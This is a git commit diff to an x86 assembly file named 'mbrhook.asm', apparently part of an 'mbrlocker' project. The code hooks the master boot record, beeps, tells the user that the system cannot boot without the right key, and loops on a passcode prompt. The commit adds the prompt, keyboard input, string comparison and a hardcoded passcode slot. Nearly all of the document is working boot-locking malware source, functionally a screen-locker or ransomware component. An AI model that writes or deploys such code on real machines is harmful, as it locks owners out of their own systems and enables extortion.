95169555bbd99a64c73544ab0e10f84e232bda72
bitwaree <bitware@duck.com>
2024-11-17 12:37:47 +0530

    updated mbrlocker code.

--- mbrhook.asm
+++ mbrhook.asm
@@ -120,7 +120,7 @@ init:
 
 bootstrap:
 	;load 8th (and onwards) sectors at physical address: 0x7c00 + (0x200 * 7) = 0x8a00
-    loadsector 0x8a00, 8, 3
+    loadsector 0x8a00, 8, 4
 	jmp mbrlocker       ; Hook/intercept to mbrlocker code
 	
 	times 0x13-($-$$) db 0x90   ; nops
@@ -189,7 +189,7 @@ mbrlocker:
 	call initspk        ; initialize speaker
 	call beepon         ; do a beep
 	
-	sleep 0xf, 0xfff0   ; wait a bit
+	sleep 0x14, 0xfff0   ; wait a bit
 	
 	call beepoff        ; stop the beeping sound
 
@@ -203,27 +203,62 @@ mbrlocker:
 	;bx and dx equals 0
 	add bx, msg	;acts like a (char *)
 
-printmsg:
-
-	;mov bx, dx
-	;add bx, msg
-
-	cmp byte [bx], 0
-	je msgprint_done	;Jmp to hlt if the string is terminated with NULL byte
-
-	printc byte [bx], 0xC	;Print char byte
-	add bx, 1
-	jmp printmsg
-
-msgprint_done:
+    mov bx, msg
+    mov cx, 0xC
+    call vid_print_str  ; print a message informing about mbr being locked
+	
 	sleep 0x10, 0xffff  ; wait a bit
 	
 	call beepon         ; do a beep
 	sleep 0x1, 0xffff   ; wait a bit
 	call beepoff
 	
-	textmode_clear      ; switch back to text mode
+	
+wrongpass_loop:
 
+	mov bx, AskPass_str
+    mov cx, 14          ; yellow text
+    call vid_print_str  ; ask for passcode
+	
+	mov bx, in_passcode
+    mov dl, 20          ; maximum buffer length
+    call scan_str       ; get the user input
+	
+	mov bx, in_passcode ; user input
+	mov dx, passcode    ; the actual pass
+	call str_cmp        ; compare the passcode
+
+	cmp al, 0
+	je correctpass_continue  ; if both passcode matches
+	
+	mov bx, WrongPass_str
+    mov cx, 0xC         ; bright red text
+    call vid_print_str  ; inform user about the passcode being wrong
+	
+	call beepon         ; do a beep
+	sleep 0x7, 0xffff   ; wait a bit
+	call beepoff        ; turn the beep off
+	
+	jmp wrongpass_loop  ; loop it until the correct passcode entered
+	
+correctpass_continue:
+	
+	videomode_clear     ; clear the screen
+	
+	call beepon         ; do a beep
+	
+	mov bx, CorrectPass_str
+    mov cx, 0xA         ; neon green text
+    call vid_print_str  ; inform user about the passcode being right 
+	
+	call beepoff        ; turn the beep off quickly
+	
+	sleep 0x5, 0xf000   ; wait a bit for user to see message
+	
+	
+	textmode_clear      ; switch back to text mode
+	
+	
 
 ; *****************************************************
 ; $                                                   $
@@ -283,8 +318,43 @@ bannerstr:
     db 0
 
 msg: db 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
-	db "           MBR is locked !   :\         ", "You can't boot into your system now.    ", 0x0A
-	db "                      --bitware.        ",0
+	db "           MBR has been locked !", 0x0A, 0xA ,0x0D, "You can't boot into your system unless   you have the right key.", 0x0A, 0x0A
+	db 0
+
+
+
+AskPass_str:     db  0x0A,0x0D, "Enter the code: ", 0
+
+CorrectPass_str: db  0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A, 0x0A
+                 db  0x0A,0x0D, "                Welcome!     ", 0
+				 
+WrongPass_str:   db  0x0A,0x0D, "The passcode is wrong! Try Again!", 0
+
+
+; *****************************************************
+; $                                                   $
+; ;--------------[Overwritten MBR code]---------------;
+; $                                                   $
+; $  'passcode' will contain a ascii passcode that    $
+; $  will be used for comparison with the received    $
+; $  keystrokes...                                    $
+; $                                                   $
+; $  * The maximum length is set to 20 charecters     $
+; $  * The recived keystrokes will be stored in       $
+; $    'in_passcode' which is also 20 charecters max. $
+; $  * In HEX editor one can find a string named      $
+; $     "PASS:", the passcode is to be placed after   $
+; $     the colon ':'                                 $
+; $                                                   $
+; *****************************************************
+
+db 'PASS:'             ; passcode signature (can be noped out if wanted)
+
+passcode:    times 21 db 0    ; the const passcode
+in_passcode: times 21 db 0    ; the entered passcode
+
+
+
 
 ;------------Function Snippets------------;
 
@@ -313,6 +383,211 @@ print_done:
         ret
 
 ; ------- FUNC END -------
+
+
+
+
+;TYPE: FUNCTION
+;prints a string in video mode
+;Usage:
+;    mov bx, <string>
+;    mov cx, <attribute>
+;    call vid_print_str
+;
+;Depends: 
+;    [MACRO] printc
+; ------- FUNC start -------
+vid_print_str:
+
+	;mov dx, bx	;reset dx register as well
+	;bx and dx equals 0
+	;mov bx, bx	            ;acts like a (char *)
+
+vid_print_str_loop:
+
+	;mov bx, dx
+	;add bx, msg
+
+	cmp byte [bx], 0
+	je vid_print_str_done	;Jmp to hlt if the string is terminated with NULL byte
+
+	printc byte [bx], cx	;Print char byte
+	add bx, 1
+	jmp vid_print_str_loop
+
+vid_print_str_done:
+	
+	ret
+
+; ------- FUNC END -------
+
+
+
+
+
+;TYPE: FUNCTION
+;Reads a string from keyboard and stores at the specified address
+; MOD: prints a asterisk (*) whenever a charecter entered
+;Usage:
+;    mov bx, <buffer_address>
+;    mov dl, <max_buffer_len>
+;    call scan_str
+;
+; Returns:
+; 'al' -> how many char read (strlen)
+; 'bx' -> pointer to end of the string (null)
+
+; ------- FUNC start -------
+scan_str:
+    
+; passed : bx -> buffer address
+;        : dl -> buffer max length
+
+; return : al -> read buffer length
+	mov ah, 0h                  ; Function 0: Read character from keyboard
+	push cx                     ; backup cx register
+	xor cl, cl                  ; NULLify cl
+
+scan_str_scanloop:
+    mov ah, 0h                  ; Function 0: Read character from keyboard
+	int 16h                     ; BIOS interrupt 16h
+	cmp al, 0x0D
+	je scan_str_entr_received   ; Jump: prepare to exit if enter key is received
+	
+	cmp cl, dl                  ; check if it's the maximum length
+	je scan_str_max_len_reached
+	
+	mov byte [bx], al           ; send the received byte in the (inc) address
+	printc '*', 0x7             ; Show a '*' whenever a key recieved
+	add bx, 1                   ; array++
+	add cl, 1                   ; cl   ++
+	;sleep 0x1, 0x7000           ; a little delay to avoid repeat
+	jmp scan_str_scanloop       ; Continue the loop until enter key is received
+	
+	
+scan_str_max_len_reached:	
+scan_str_entr_received:
+	
+scan_str_exit:
+
+	mov byte [bx], 0            ; Null terminate the string
+	mov al, cl                  ; Move the counter to al
+	pop cx
+	
+	ret
+; ------- FUNC end -------
+
+
+
+
+
+;TYPE: FUNCTION
+;finds the length of a null-terminated string (strlen)
+;Usage:
+;    mov bx, <string>
+;    call str_len
+;
+; Returns:
+; 'al' -> (0<length<255) the length
+
+; ------- FUNC start -------
+str_len:
+    
+; passed : bx -> buffer address
+
+; return : al -> length
+    push bx
+    xor al, al
+
+str_cmp_loop:
+    
+	cmp byte [bx], 0
+	je str_len_exit             ; goto exit if the null byte reached
+
+	add bx, 1                   ; array++
+	add al, 1                   ;    al++
+	jmp str_cmp_loop            ; Continue the loop until null-byte reached
+	
+
+	
+str_len_exit:
+	pop bx
+	ret
+; ------- FUNC end -------
+
+
+
+
+
+
+;TYPE: FUNCTION
+;Compares two strings
+;Usage:
+;    mov bx, <string1>
+;    mov dx, <string2>
+;    call str_cmp
+;
+; Returns:
+; 'al' -> 0 if the strings are identical
+
+; ------- FUNC start -------
+str_cmp:
+    
+; passed : bx -> buffer1 address
+;        : dx -> buffer2 address
+
+; return : al -> true/false
+
+	push cx
+	
+    mov cx, bx
+	mov bx, dx
+	call str_len                ; Get the length of the second string first
+	mov ah, al                  ; MOV that into ah
+	
+	mov bx, cx
+	call str_len                ; Get the length of the first string
+	
+	cmp ah, al
+	jne str_cmp_nonidentical    ; length is not equal means not identical
+	
+	xor al, al
+str_cmp_scanloop:
+
+    ; now 'al' is going to be index counter and 'ah' is the string length
+	; and 'ch' is going to contain the str2 char and 'cl' will contain str1 char
+	push bx                     ; backup str1
+	mov bx, dx                  ; load str2 in `bx`
+	mov ch, byte [bx]           ; store the char of str2 on 'ch'
+	
+	pop bx                      ; get the previous 'bx' value (str1) back
+	mov cl, byte [bx]           ; store the char of str1 on 'cl'
+	
+	cmp ch, cl
+	jne str_cmp_nonidentical    ; char mismatch means non-identical
+	
+	cmp ah, al                  ; if the scan index counter is same as strlen
+	je str_cmp_identical        ; it's identical
+	add al, 1                   ; else, increment 'al' by one
+	add bx, 1                   ; and,  increment 'bx' by one
+	add dx, 1                   ; and,  increment 'dx' by one
+    jmp str_cmp_scanloop        ; loop it :)
+	
+str_cmp_nonidentical:
+	mov al, 1                  ; set 'al' to 1
+	jmp str_cmp_exit            ; exit
+
+str_cmp_identical:
+    xor al, al                  ; set 'al' to zero
+	jmp str_cmp_exit            ; exit
+
+str_cmp_exit:
+
+	pop cx                      ; get the cx value back
+	
+	ret
+; ------- FUNC end -------
+
 
 
 
@@ -380,3 +655,5 @@ beepoff:
 
 	ret
 ; ------- FUNC start -------
+
+
